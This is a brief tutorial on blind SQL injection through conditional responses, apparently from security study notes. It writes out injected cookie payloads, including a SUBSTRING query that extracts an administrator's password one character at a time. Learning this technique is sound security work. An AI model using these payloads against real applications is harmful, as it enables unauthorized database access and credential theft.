---
description: >-
  Blind SQL Injection arises when an application is vulnerable but no visual
  response or errors occur.
---

# Blind SQL Injection

This is a very common type of SQL Injection.

With blind SQL injection vulnerabilities, many techniques such as UNION attacks, are not effective because they rely on being able to see the results of the selected query.



### Exploiting blind SQL Injection by triggering conditional responses

Take for example a Tracking Cookie:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`\


**The server checks if the cookie exists, and might return something like: "Welcome back".**

_**Manipulate the request:**_

`Cookie: TrackingId=testing' AND '1'='1`&#x20;

`Cookie: TrackingId=testing' AND '1'='2`



We can systematically extract passwords as follows:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`\


We continue with this until we extract the entire password.
